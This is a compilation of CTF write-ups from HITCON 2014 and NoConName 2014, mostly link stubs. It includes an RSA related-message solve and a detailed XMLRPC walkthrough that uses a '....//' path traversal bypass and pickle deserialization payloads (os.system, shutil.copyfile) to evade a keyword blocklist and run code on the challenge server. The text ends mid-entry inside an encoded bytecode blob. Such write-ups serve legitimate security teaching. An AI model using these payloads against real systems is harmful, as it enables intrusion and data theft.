# HITCON CTF 2014: rsaha

**Category:** Crypto
**Points:** 200
**Description:**

> Can you break RSA?
> [https://dl.dropbox.com/s/xqkoamfvas1rdb7/rsaha-fe50cf1bcae41e8ec6eeebccf3f0de7c.py](rsaha-fe50cf1bcae41e8ec6eeebccf3f0de7c.py)
> [http://ctf.tw/rsaha-fe50cf1bcae41e8ec6eeebccf3f0de7c.py](rsaha-fe50cf1bcae41e8ec6eeebccf3f0de7c.py)
>
> ```bash
> $ nc 54.64.40.172 5454
> ```

## Write-up

By studying the given code we learn that we have to enter the correct number 10 times, after which the program will give us the flag. The most important part is the following:

```py
def encrypt(bits, m):
    p = random_prime(bits)
    q = random_prime(bits)
    n = p * q
    assert m < n
    print n
    print m ** 3 % n
    print (m + 1) ** 3 % n
```

The program gives us `n`, `m ** 3 % n` and `(m + 1) ** 3 % n` and asks us `m` in return. After some research on RSA encryption we notice that this encryption can be broken because we are given two encrypted messages. We know those messages are encrypted using the same key and related to each other. This is also known as a [Franklin-Reiter Related Message Attack](http://en.wikipedia.org/wiki/Coppersmith%27s_Attack#Franklin-Reiter_Related_Message_Attack). This leads us to the next formula:

```
((m + 1) ** 3 +  2 * m ** 3 - 1) / ((m + 1) ** 3 - m ** 3 + 2) = m mod n
```

We can use the [extended Euclidean algorithm](http://en.wikipedia.org/wiki/Extended_Euclidean_algorithm) to calculate `m` from this formula. Here is a snippet of the Python code I wrote:

```py
# Return a triple `(g, x, y)` such that `ax + by = g = gcd(a, b)`.
def egcd(a, b):
  if a == 0:
    return (b, 0, 1)
  else:
    g, y, x = egcd(b % a, a)
    return (g, x - (b // a) * y, y)

m_n1 = m_31 + 2*m_3 - 1
m_n2 = m_31 - m_3 + 2
f = m_n1%n
g = m_n2%n
sol1 = egcd(f,n)
sol2 = egcd((1-n*sol1[2])*g/f,n)
m = sol2[1]
m2 = -m
if m < 0:
  m += n
# If it’s not really `m`, it’s the mod inv of `m`.
if (m ** 3 % n) != m_3:
  m = m2
if m < 0:
  m += n
```

This decrypts our given strings into the message we need to return.

Finally the program gave us a final message holding the key. Of course we had to decrypt that one too.

The flag is `HITCON{RSA is a really secure algorithm, right?}`.

## Other write-ups and resources

* <https://rzhou.org/~ricky/hitcon2014/rsaha/>
# HITCON CTF 2014: rsbo

**Category:** Pwnable
**Points:** 150
**Description:**

> ```bash
> $ nc 210.61.8.96 51342
> ```
>
> [https://github.com/hitcon2014ctf/ctf/raw/master/rsbo-4a707e7d07e87ab97348be36efea28dc](rsbo-4a707e7d07e87ab97348be36efea28dc)
> [https://dl.dropbox.com/s/ydsuwrxv7soj0je/rsbo-4a707e7d07e87ab97348be36efea28dc](rsbo-4a707e7d07e87ab97348be36efea28dc)

## Write-up

(TODO)

## Other write-ups and resources

* <http://acez.re/ctf-writeup-hitcon-ctf-2014-callme-rsbo-ty-sh41lcode/>
* <http://v0ids3curity.blogspot.in/2014/08/hitcon-ctf-2014-rsbo-pwnable-150-team.html>
* <http://www.idabook.com/ctf/rsbo_writeup.txt>
* <https://rzhou.org/~ricky/hitcon2014/rsbo/>
* <http://tasteless.eu/2014/08/hitcon2014-rsbo-pwn150/>
* [Chinese](http://ddaa.logdown.com/posts/221204-hitcon-ctf-2014-pwn-150-rsbo)
# HITCON CTF 2014: sha1lcode

**Category:** Shellcode
**Points:** 300
**Description:**

> Pwn this and cat the flag.
>
> ```bash
> nc 210.61.2.51 5566
> ```
>
> [https://raw.githubusercontent.com/hitcon2014ctf/ctf/master/sha1lcode-5b43cc13b0fb249726e0ae175dbef3fe](sha1lcode-5b43cc13b0fb249726e0ae175dbef3fe)
> [https://dl.dropbox.com/s/gkng3jqe94sdrxy/sha1lcode-5b43cc13b0fb249726e0ae175dbef3fe](sha1lcode-5b43cc13b0fb249726e0ae175dbef3fe)

## Write-up

(TODO)

## Other write-ups and resources

* <http://tasteless.eu/2014/08/hitcon2014-sha1lcode-shellcode300/>
* <http://acez.re/ctf-writeup-hitcon-ctf-2014-callme-rsbo-ty-sh41lcode/>
* <http://www.idabook.com/ctf/sha1lcode_writeup.txt>
* <http://blog.0x80.org/hitcon-writeup-shellcode/>
* <https://rzhou.org/~ricky/hitcon2014/sha1lcode/>
# HITCON CTF 2014: stkof

**Category:** Pwnable
**Points:** 550
**Description:**

> ```bash
> nc 54.64.45.35 3573
> ```
>
> [https://github.com/hitcon2014ctf/ctf/raw/master/a679df07a8f3a8d590febad45336d031-stkof](a679df07a8f3a8d590febad45336d031-stkof)

**Hint:**

> System Information:
> Hardware: EC2 r3.2xlarge
> Environment: default Ubuntu 14.04 x64
>
> BTW, also the EC2 server is strong, we still set alarm and cgroup memory to prevent DoS attack. Don't be surprised if your connection be closed unexceptedly.

## Write-up

(TODO)

## Other write-ups and resources

* <http://acez.re/ctf-writeup-hitcon-ctf-2014-stkof-or-modern-heap-overflow/>
* <https://rzhou.org/~ricky/hitcon2014/stkof/>
* <http://rex.sex/ctf/2014/hitcon/stkof/ex.py>
# HITCON CTF 2014: Tarmful

**Category:** Trivia
**Points:** 128
**Description:**
>The challenge is a series of archive files inside each other. Each internal zip will be of different format. Initially I tried to open them based on decreasing numbers as well as recognising filetype by names. The final approach I used involved using file magic to detect the filetype and tarfile and zipfile modules to extract the file. Also one of the files had a UTF8 character that caused the extraction to fail. So I just renamed the file and proceeded.


> Just decompress them all.
> [https://raw.githubusercontent.com/hitcon2014ctf/ctf/master/tarmful-3f13b82f7794de783adfd6fa9928ad2c.zip](tarmful-3f13b82f7794de783adfd6fa9928ad2c.zip)
> [https://dl.dropbox.com/s/oh8cb6i63x7zggh/tarmful-3f13b82f7794de783adfd6fa9928ad2c.zip]()

## Write-up

This challenge was simply to decompress the 1024 `.zip`, `.tar.gz`, and `.tar.bz2` archives which were nested within each other. See the `tarmfulsolver.py` file for an automated tool to handle this in no time flat.

Flag is: `HITCON{SO0O0OO_MaNy_7Ar_Le\/eLs}`.

## Other write-ups and resources

* <https://ucs.fbi.h-da.de/writeup-hitcon-tarmful/>
# HITCON CTF 2014: ty

**Category:** Pwnable
**Points:** 150
**Description:**

> ```bash
> $ nc 210.71.253.109 9123
> ```
>
> [https://github.com/hitcon2014ctf/ctf/raw/master/ty/ty-b83f0d0edeb8cfad76d30eddc58da139](ty-b83f0d0edeb8cfad76d30eddc58da139)
> [https://dl.dropbox.com/s/96bzdejxwvpnimj/ty-b83f0d0edeb8cfad76d30eddc58da139](ty-b83f0d0edeb8cfad76d30eddc58da139)

## Write-up

(TODO)

## Other write-ups and resources

* <http://acez.re/ctf-writeup-hitcon-ctf-2014-callme-rsbo-ty-sh41lcode/>
* [PoC by g05u](https://gist.github.com/g05u/9c934e367c309d002d65)
* <https://rzhou.org/~ricky/hitcon2014/ty/>
* <http://pastebin.com/pB4nK8SS>
# HITCON CTF 2014: vash

**Category:** Trivia
**Points:** 10
**Description:**

> Find out the flag. It should be there, you know.
>
> ```bash
> nc 203.66.57.167 31337
> ```

**Hint:**

> Most (but not all) challenge's environment is same as this one.

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# HITCON CTF 2014: wtf6

**Category:** Crypto
**Points:** 500
**Description:**

> Can you break both MD5 and SHA1 simultaneously?
>
> ```bash
> $ nc 210.61.8.97 6666
> ```
> [https://raw.githubusercontent.com/hitcon2014ctf/ctf/master/wtf6-fe0677d1eb5a03701b2afb8398b9a70e.rb](wtf6-fe0677d1eb5a03701b2afb8398b9a70e.rb)
> [https://dl.dropbox.com/s/jivlfnuqerdxxk9/wtf6-fe0677d1eb5a03701b2afb8398b9a70e.rb](wtf6-fe0677d1eb5a03701b2afb8398b9a70e.rb)

**Hint:**

> HAPPY BIRTHDAY
>
> celebrate your birthday cleverly, or buy more rams as birthday gift

## Write-up

(TODO)

The flag is `HITCON{What The Fucking Secure Hash, called wtfsh?}`.

## Other write-ups and resources

* <https://gist.github.com/ShikChen/a8bfbb4f5f025fe87617>
# NoConName 2014 Finals: 5h311

**Category:** Reversing
**Points:** 200
**Description:**

Connect to the service listening at 10.210.8.1:6969 and get the flag.

## Write-up

<http://ctfcrew.org/writeup/89>

Flag: `Yahoooo\_its\_my\_flag`

## Other write-ups and resources

* <https://ctfcrew.org/writeup/89>
* [Spanish](http://testpurposes.net/2014/11/01/write-up-5h311-final-ctf-ncn-2014/)
# NoConName 2014 Finals: MoonKV

**Category:** Misc
**Points:** ???
**Description:**

Can you see the flag?

## Write-up

We are given a .mkv video, upon examination there is an alternate audio track. Extracting this track reveals a digitally encoded image using SSTV. Using any SSTV decoding software reveals a picture of the moon landing, at the bottom of the image is the flag in red letters.

Caveat: the audio track is about 10 seconds longer than the video, so if the video processing software you're using is bad, it may get truncated. Since the flag is written at the bottom of the image, truncating the last seconds effectively removes the flag.
# NoConName 2014 CTF write-ups

* [Scoreboard](scoreboard.txt)

## Completed write-ups

* [MoonKV](MoonKV)
* [xmlrpc](xmlrpc)

## External write-ups only

* [5h311](5h311)
* [Vodka](Vodka)
* [WireTap](WireTap)

## Missing write-ups

* none yet
# NoConName 2014 Finals: Vodka

**Category:** Forensics
**Points:** 400
**Description:**

No hints :( just get the flag.

## Write-up

<http://ctfcrew.org/writeup/90>

Note: the linked writeup contains a small error, here's the correct flag:

![Screenshot with the flag](screencap.png)

Flag: NCNdeadb6adec4c77a40c23e04770924d3c5b18face

## Other write-ups and resources

* <https://ctfcrew.org/writeup/90>
* [Spanish](http://testpurposes.net/2014/11/07/write-up-vodka-final-ctf-ncn-2014/)
# NoConName 2014 Finals: WireTap

**Category:** Steganography
**Points:** 200
**Description:**

Does it sound like a flag? Maybe... I don't know...

## Write-up

(TODO)

Flag: `NcN_132238aba8928f9655eeb09939eba1f963c18183`

## Other write-ups and resources

* <https://ctfcrew.org/writeup/91>
# NoConName 2014 Finals: XMLRPC

**Category:** Exploiting
**Points:** ???
**Description:**

Looks like you're in a pretty pickle now! Can you get the flag?

## Write-up

We get an IP address, scanning with nmap we find port 12345 open. It's an HTTP server that responds to XMLRPC requests.

```
PORT      STATE SERVICE VERSION
12345/tcp open  http    BaseHTTP 0.3 (Python SimpleXMLRPCServer; Python 2.7.3)
|_http-title: Error response
|_http-methods: No Allow or Public header in OPTIONS response (status code 501)
```

Using Python's xmlrpc library we get:

```
$ python
Python 2.7.3 (default, Mar 13 2014, 11:03:55)
[GCC 4.7.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from xmlrpclib import *
>>> s = ServerProxy("http://target:12345", allow_none=True)
>>> s.system.listMethods()
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python2.7/xmlrpclib.py", line 1224, in __call__
    return self.__send(self.__name, args)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1578, in __request
    verbose=self.__verbose
  File "/usr/lib/python2.7/xmlrpclib.py", line 1264, in request
    return self.single_request(host, handler, request_body, verbose)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1312, in single_request
    response.msg,
xmlrpclib.ProtocolError: <ProtocolError for target:12345/RPC2: 501 encoding 'identity' not supported>
```

The error message says the server requires some special kind of encoding. Looking at the HTTP headers we see only one encoding is supported (gzip) so we force our client to use it.

```
>>> t = Transport()
>>> t.encode_threshold = 0
>>> s = ServerProxy("http://target:12345", transport=t, allow_none=True)
>>> s.system.listMethods()
['get_api_endpoints', 'system.listMethods', 'system.methodHelp', 'system.methodSignature']
```

There's only one method, get_api_endpoints. Let's call it.

```
>>> s.get_api_endpoints()
['/RPC2', '/random', '/fileserver']
```

Since /RPC2 is the default XMLRPC path, we'll assume the other two are virtual XMLRPC server paths. Let's try them:

```
>>> s = ServerProxy("http://target:12345/fileserver", transport=t, allow_none=True)
>>> s.system.listMethods()
['append', 'delete', 'listdir', 'read', 'system.listMethods', 'system.methodHelp', 'system.methodSignature']
```

This looks like some kind of file server, with methods to list directories, read, write and delete files.

```
>>> s.listdir()
['flag.txt']
```

Looking good!

```
>>> print s.read('flag.txt')
Jack Sparrow: How did you get here?
Will Turner: Sea turtles, mate. A pair of them strapped to my feet.
Jack Sparrow: Not so easy, is it?
```

Meh, it was a trap :D

Let's try to exploit this service...

```
>>> s.read('/etc/passwd')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python2.7/xmlrpclib.py", line 1224, in __call__
    return self.__send(self.__name, args)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1578, in __request
    verbose=self.__verbose
  File "/usr/lib/python2.7/xmlrpclib.py", line 1264, in request
    return self.single_request(host, handler, request_body, verbose)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1297, in single_request
    return self.parse_response(response)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1473, in parse_response
    return u.close()
  File "/usr/lib/python2.7/xmlrpclib.py", line 793, in close
    raise Fault(**self._stack[0])
xmlrpclib.Fault: <Fault 1: "<type 'exceptions.ValueError'>:Hacking attempt detected! Your IP address has been traced, an FBI team will soon arrive to your location. Please stay where you are and wait for your arrest.">
```

While the FBI is coming, we keep looking. ;)

```
>>> s.listdir('/')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python2.7/xmlrpclib.py", line 1224, in __call__
    return self.__send(self.__name, args)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1578, in __request
    verbose=self.__verbose
  File "/usr/lib/python2.7/xmlrpclib.py", line 1264, in request
    return self.single_request(host, handler, request_body, verbose)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1297, in single_request
    return self.parse_response(response)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1473, in parse_response
    return u.close()
  File "/usr/lib/python2.7/xmlrpclib.py", line 793, in close
    raise Fault(**self._stack[0])
xmlrpclib.Fault: <Fault 1: "<type 'exceptions.ValueError'>:Hacking attempt detected! Your IP address has been traced, an FBI team will soon arrive to your location. Please stay where you are and wait for your arrest.">
```

Nope...

```
>>> s.listdir('../')
['flag.txt']
>>> s.listdir('../../../../')
['flag.txt']
```

Uhm, interesting. We got exactly the same result as an empty parameter.

```
>>> s.listdir('../../../../etc/passwd')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python2.7/xmlrpclib.py", line 1224, in __call__
    return self.__send(self.__name, args)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1578, in __request
    verbose=self.__verbose
  File "/usr/lib/python2.7/xmlrpclib.py", line 1264, in request
    return self.single_request(host, handler, request_body, verbose)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1297, in single_request
    return self.parse_response(response)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1473, in parse_response
    return u.close()
  File "/usr/lib/python2.7/xmlrpclib.py", line 793, in close
    raise Fault(**self._stack[0])
xmlrpclib.Fault: <Fault 1: "<type 'exceptions.ValueError'>:Invalid directory: ./fileserver/etc/passwd">
```

Now we know the real path for the file flag.txt, or at least a relative path to wherever the server is installed. We also know the sequences "../" are being filtered out from the input. This is a classic, albeit flawed way of avoiding path traversal vulnerabilities.

```
>>> s.listdir('....//')
['fileserver', 'supervise', 'server.py', 'run']
```

This looks better - by removing "../" from "....//" we get "../" again, so we can list directories above the root. We know "fileserver" is where the files are, and "server.py" is probably the server code. Let's try reading it...

```
>>> s.read('....//server.py')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python2.7/xmlrpclib.py", line 1224, in __call__
    return self.__send(self.__name, args)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1578, in __request
    verbose=self.__verbose
  File "/usr/lib/python2.7/xmlrpclib.py", line 1264, in request
    return self.single_request(host, handler, request_body, verbose)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1297, in single_request
    return self.parse_response(response)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1473, in parse_response
    return u.close()
  File "/usr/lib/python2.7/xmlrpclib.py", line 793, in close
    raise Fault(**self._stack[0])
xmlrpclib.Fault: <Fault 1: "<type 'exceptions.ValueError'>:Hacking attempt detected! Your IP address has been traced, an FBI team will soon arrive to your location. Please stay where you are and wait for your arrest.">
```

Oops, this call doesn't have the bug! Well, we still have a service to explore...

```
>>> s = ServerProxy("http://target:12345/random", transport=t, allow_none=True)
>>> s.system.listMethods()
['getstate', 'random', 'seed', 'setstate', 'system.listMethods', 'system.methodHelp', 'system.methodSignature']
```

Looks like a pseudo random generator.

```
>>> s.random()
0.891038931836746
>>> s.random()
0.45602713966818337
>>> s.random()
0.9581700716673957
>>> s.random()
0.22924179661741917
```

Indeed. Let's try out getstate()...

```
>>> s.getstate()
'KEkxCihJNDkzOApJMjc0NDYKSTQ4NjcKdHAxCk50Lg==\n'
```

That's base64, we decode it:

```
>>> s.getstate().decode('base64')
'(I1\n(I4938\nI27446\nI4867\ntp1\nNt.'
```

This is a bit more mysterious, but with a sharp eye and a little patience we can guess it's Python's serialization format (pickle) as hinted in the description.

```
>>> from cPickle import *
>>> loads(s.getstate().decode('base64'))
(1, (4938, 27446, 4867), None)
```

Now that we know the format, let's try sending it garbage.

```
>>> s.setstate(dumps((1, (4938, 27446, 4867), None)).encode('base64'))
>>> s.setstate(dumps((1, (4938, 27446, 0), None)).encode('base64'))
>>> s.setstate(dumps((1, (4938, 0, 0), None)).encode('base64'))
>>> s.setstate(dumps((1, (0, 0, 0), None)).encode('base64'))
>>> s.setstate(dumps((0, (0, 0, 0), None)).encode('base64'))
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python2.7/xmlrpclib.py", line 1224, in __call__
    return self.__send(self.__name, args)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1578, in __request
    verbose=self.__verbose
  File "/usr/lib/python2.7/xmlrpclib.py", line 1264, in request
    return self.single_request(host, handler, request_body, verbose)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1297, in single_request
    return self.parse_response(response)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1473, in parse_response
    return u.close()
  File "/usr/lib/python2.7/xmlrpclib.py", line 793, in close
    raise Fault(**self._stack[0])
xmlrpclib.Fault: <Fault 1: "<type 'exceptions.ValueError'>:Invalid state data">
```

But the interesting thing here is the pickle format is known to be vulnerable to remote code injection, so we can just upload whatever Python code we want to run. With this we can read the server.py file, for example by copying it to the directory we can access.

```
>>> class Exploit(object):
...   def __reduce__(self):
...     import os
...     return (os.system, ('cp ./server.py ./fileserver/server.py',))
...
>>> s.setstate(dumps(Exploit()).encode('base64'))
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python2.7/xmlrpclib.py", line 1224, in __call__
    return self.__send(self.__name, args)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1578, in __request
    verbose=self.__verbose
  File "/usr/lib/python2.7/xmlrpclib.py", line 1264, in request
    return self.single_request(host, handler, request_body, verbose)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1297, in single_request
    return self.parse_response(response)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1473, in parse_response
    return u.close()
  File "/usr/lib/python2.7/xmlrpclib.py", line 793, in close
    raise Fault(**self._stack[0])
xmlrpclib.Fault: <Fault 1: "<type 'exceptions.ValueError'>:Hacking attempt detected! Your IP address has been traced, an FBI team will soon arrive to your location. Please stay where you are and wait for your arrest.">
```

Oops, it caught us! But since the security of this service seems based on simple filters, let's try to bypass it. After all, we don't need a shell, we can run any Python code we want.

```
>>> class Exploit(object):
...   def __reduce__(self):
...     import shutil
...     return (shutil.copyfile, ('./server.py', './fileserver/server.py'))
...
>>> s.setstate(dumps(Exploit()).encode('base64'))
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python2.7/xmlrpclib.py", line 1224, in __call__
    return self.__send(self.__name, args)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1578, in __request
    verbose=self.__verbose
  File "/usr/lib/python2.7/xmlrpclib.py", line 1264, in request
    return self.single_request(host, handler, request_body, verbose)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1297, in single_request
    return self.parse_response(response)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1473, in parse_response
    return u.close()
  File "/usr/lib/python2.7/xmlrpclib.py", line 793, in close
    raise Fault(**self._stack[0])
xmlrpclib.Fault: <Fault 1: "<type 'exceptions.ValueError'>:Invalid state data">
```

There! Out exploit is no longer detected. The error message is fine, we're sending it crap, but let's check if the code injection worked.

```
>>> s = ServerProxy("http://target:12345/fileserver", transport=t, allow_none=True)
>>> s.listdir()
['flag.txt', 'server.py']
```

It worked! Now we can read the file with the read() method.

```
#!/usr/bin/env python

from cPickle import loads, dumps
from hashlib import sha1
from os import listdir, unlink
from os.path import abspath, dirname, join
from random import WichmannHill
from SimpleXMLRPCServer import MultiPathXMLRPCServer, SimpleXMLRPCRequestHandler, SimpleXMLRPCDispatcher

class RandomServer(object):

    def __init__(self):
        self.rnd = WichmannHill()

    def seed(self, num):
        """Set the seed for the random number generator."""
        self.rnd.seed(num)

    def random(self):
        """Get a random number."""
        try:
            return self.rnd.random()
        except Exception:
            raise ValueError("Invalid seed value")

    def getstate(self):
        """Get the state of the random number generator."""
        return dumps(self.rnd.getstate()).encode("base64")

    def setstate(self, state):
        """Restore the state of the random number generator."""
        state = state.decode("base64")
        test = state.lower()
        if "system" in test or "/bin/sh" in test or "popen" in test or "proc" in test:
            raise ValueError(
                "Hacking attempt detected! Your IP address has been traced, "
                "an FBI team will soon arrive to your location. Please stay "
                "where you are and wait for your arrest.")
        try:
            self.rnd.setstate(loads(state))
        except Exception:
            raise ValueError("Invalid state data")

class FileServer(object):

    def listdir(self, directory = "."):
        """Get a directory listing. Optionally specify a directory to list."""
        directory = directory.replace("../", "")
        rootdir = join(dirname(__file__), "fileserver")
        directory = join(rootdir, directory)
        if not directory.startswith(rootdir):
            raise ValueError(
                "Hacking attempt detected! Your IP address has been traced, "
                "an FBI team will soon arrive to your location. Please stay "
                "where you are and wait for your arrest.")
        try:
            return listdir(directory)
        except Exception:
            raise ValueError("Invalid directory: %s" % directory)

    def read(self, filename):
        """Get the contents of a file."""
        filename = filename.replace("../", "")
        rootdir = abspath(join(dirname(__file__), "fileserver"))
        filename = abspath(join(rootdir, filename))
        if not filename.startswith(rootdir):
            raise ValueError(
                "Hacking attempt detected! Your IP address has been traced, "
                "an FBI team will soon arrive to your location. Please stay "
                "where you are and wait for your arrest.")
        try:
            with open(filename, "rb") as fd:
                return fd.read()
        except Exception:
            raise ValueError("Invalid filename: %s" % filename)

    def append(self, filename, data):
        """Append data to the end of a file."""
        filename = filename.replace("../", "")
        rootdir = abspath(join(dirname(__file__), "fileserver"))
        filename = abspath(join(rootdir, filename))
        if not filename.startswith(rootdir):
            raise ValueError(
                "Hacking attempt detected! Your IP address has been traced, "
                "an FBI team will soon arrive to your location. Please stay "
                "where you are and wait for your arrest.")
        try:
            with open(filename, "ab") as fd:
                return fd.write(data)
        except Exception:
            raise ValueError("Invalid filename: %s" % filename)

    def delete(self, filename):
        """Delete a file."""
        filename = filename.replace("../", "")
        rootdir = abspath(join(dirname(__file__), "fileserver"))
        filename = abspath(join(rootdir, filename))
        if not filename.startswith(rootdir):
            raise ValueError(
                "Hacking attempt detected! Your IP address has been traced, "
                "an FBI team will soon arrive to your location. Please stay "
                "where you are and wait for your arrest.")
        try:
            unlink(filename)
        except Exception:
            raise ValueError("Invalid filename: %s" % filename)

class SecretServer(object):

    def get_answer_to_life_the_universe_and_everything(self):
        return 42

    def get_number_one_source_for_the_truth(self):
        return "http://www.truthism.com/"

    def get_secrets_of_time_travel(self):
        return "https://www.google.com/search?q=John+Titor"

    def get_world_nuclear_launch_codes(self):
        return "NCN" + sha1("New World Order").hexdigest()

class InfoServer(object):
    def get_api_endpoints(self):
        """Enumerate all public API endpoints."""
        return [
            x for x in RequestHandler.rpc_paths
            if not x.startswith("/secret_")
        ]

class RequestHandler(SimpleXMLRPCRequestHandler):
    encode_threshold = 0
    rpc_paths = (
        "/RPC2",
        "/random",
        "/fileserver",
        "/secret_illuminati_world_domination_plans"
    )

    def decode_request_content(self, data):
        encoding = self.headers.get("content-encoding", "identity").lower()
        if encoding != "gzip":
            self.send_response(501, "encoding %r not supported" % encoding)
        return SimpleXMLRPCRequestHandler.decode_request_content(self, data)

if __name__ == "__main__":

    server = MultiPathXMLRPCServer(("0.0.0.0", 12345),
                requestHandler=RequestHandler,
                allow_none=True, encoding="utf8")

    random_server = SimpleXMLRPCDispatcher(allow_none=True, encoding="utf8")
    random_server.register_introspection_functions()
    random_server.register_instance(RandomServer())
    server.add_dispatcher("/random", random_server)

    file_server = SimpleXMLRPCDispatcher(allow_none=True, encoding="utf8")
    file_server.register_introspection_functions()
    file_server.register_instance(FileServer())
    server.add_dispatcher("/fileserver", file_server)

    secret_server = SimpleXMLRPCDispatcher(allow_none=True, encoding="utf8")
    secret_server.register_introspection_functions()
    secret_server.register_instance(SecretServer())
    server.add_dispatcher("/secret_illuminati_world_domination_plans", secret_server)

    info_server = SimpleXMLRPCDispatcher(allow_none=True, encoding="utf8")
    info_server.register_introspection_functions()
    info_server.register_instance(InfoServer())
    server.add_dispatcher("/RPC2", info_server)

    server.serve_forever()
```

Now we have all we need. Reading the source code we can understand what it does and calculate the flag. But why not make the server itself tell us the flag? There turned out to be a secret API endpoint!

```
>>> s = ServerProxy("http://target:12345/secret_illuminati_world_domination_plans", transport=t, allow_none=True)
>>> s.system.listMethods()
['get_answer_to_life_the_universe_and_everything', 'get_number_one_source_for_the_truth', 'get_secrets_of_time_travel', 'get_world_nuclear_launch_codes', 'system.listMethods', 'system.methodHelp', 'system.methodSignature']
>>> s.get_answer_to_life_the_universe_and_everything()
42
>>> s.get_number_one_source_for_the_truth()
'http://www.truthism.com/'
>>> s.get_secrets_of_time_travel()
'https://www.google.com/search?q=John+Titor'
>>> s.get_world_nuclear_launch_codes()
'NCN298f74dba8de5945adb45b0fb43a4a4f141b8bfa'
```

That last one is the flag. The rest of that nonsense I won't explain, it's much more fun to find out on your own. ;)

The code to generate the flag is:

```
    def get_world_nuclear_launch_codes(self):
        return "NCN" + sha1("New World Order").hexdigest()
```

Finally, we delete the file "server.py" so we don't help the other teams ;)

```
>>> s = ServerProxy("http://target:12345/fileserver", transport=t, allow_none=True)
>>> s.delete('server.py')
>>> s.listdir()
['flag.txt']
```

Another option was to copy the file with another name starting with a dot, to make it hidden. The listdir() method in this service doesn't list hidden files.
# NoConName 2014 Quals: cannaBINoid

**Category:** Binary
**Points:** 300
**Description:**

Super secure cloud service.

## Write-up

<http://www.spectrix.tn/no-con-name-ctf-quals-2014-cannabinoid-bin300-writeup/>

Flag: `NcN\_effaf80a641b28a8d8a750b99ef740593bb3dcbd`

## Other write-ups and resources

* <http://www.incertia.net/blog/noc0nname-quals-2014-cannabinoid-300/>
# NoConName 2014 Quals: eXPLicit

**Category:** Crypto
**Points:** 100
**Description:**

The flag is right there, in front of your eyes.

## Write-up

(TODO)

Flag: `ncn\_deadbeafcafebadbabefeeddefacedbedfadedec`

## Other write-ups and resources

* <https://ctfcrew.org/writeup/66>
* <http://givemesecurity.info/2014/09/15/no-con-name-ctf-quals-2014-cryptonite-writeup/>
* <http://www.incertia.net/blog/noc0nname-quals-2014-cryptonite-100/>
# NoConName 2014 Quals: eXPLicit

**Category:** Exploiting
**Points:** 500
**Description:**

Make me eXPLode! Hint: maybe you want to give a look at the binary...

## Write-up

(TODO)

Flag: NcN\_97740ead1060892a253be8ca33c6364a712b21d2

## Other write-ups and resources

* <http://v0ids3curity.blogspot.in/2014/09/no-con-name-ctf-quals-2014-explicit-500.html>
* <http://www.incertia.net/blog/noc0nname-2014-quals-explicit-500/>
* <http://hacktracking.blogspot.de/2014/09/ncn-ctf-quals-2k14-explicit-500-points.html>
* <https://ctfcrew.org/writeup/68>
# NoConName 2014 Quals: inBINcible

**Category:** Binary
**Points:** 400
**Description:**

Get the key. The flag is: "NcN\_" + sha1sum(key)

## Write-up

* <http://jolmos.blogspot.com.es/2014/09/inbincible-writeup-golang-binary.html>
* <http://rce4fun.blogspot.com.es/2014/09/nonconname-2014-inbincible-reversing.html>
* <http://codigoparallevar.com/blog/2014/writeup-de-inbincible-ncn-ctf-quals/> (in Spanish)

Flag: `NcN_ce71ba32ccf191cc3b62ae73c7ffd1acf5e2f296`

## Other write-ups and resources

* <http://rce4fun.blogspot.de/2014/09/nonconname-2014-inbincible-reversing.html>
# NoConName 2014 Quals: inMISCible

**Category:** Misc
**Points:** 200
**Description:**

No hints :( just go and get the flag.

## Write-up

The file has no extension, but using the "file" command we find out it's a gzip archive and the original name is "ctf.py.gz".

```
$ file ctf
ctf: gzip compressed data, was "ctf.py", from Unix, last modified: Thu Jul 24 18:42:37 2014
$ mv ctf ctf.py.gz
$ gzip -d ctf.py.gz
$ file ctf.py
ctf.py: Python script, ASCII text executable
```

The source code of this Python file is ROT-13 encoded.

```
$ head ctf.py -n 2
#!/usr/bin/env python
# -*- coding: rot13 -*-
```

And when we run it we get the following output:

```
$ python ctf.py
Nope!
```

So we'll have to look at the code to see what's wrong. Let's decode it:

```
$ python
Python 2.7.3 (default, Mar 13 2014, 11:03:55)
[GCC 4.7.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> d=open("ctf.py","rU").read().decode("rot13")
>>> d=d.replace('.decode("ebg13")', '')
>>> open("ctf_decoded.py", "w").write(d)
>>> exit()
```

Now we can read the source.

```
#!/hfe/ova/rai clguba
# -*- pbqvat: ebg13 -*-
import os
import marshal
import new

global flag

def f():
    global flag
    flag = "Nope!"

bytecode = """
YwAAAAAAAAAAAwAAAEAAAABzlwAAAGQAAGQBAGwAAG0BAFoBAAFkAABkAgBsAgBtAwBaAwABZQMA
ZAMAZAQAgwIAZAUAawIAcpMAZAYAYQQAdAQAZAcAN2EEAHQEAGQIADdhBAB0BABkCQA3YQQAdAQA
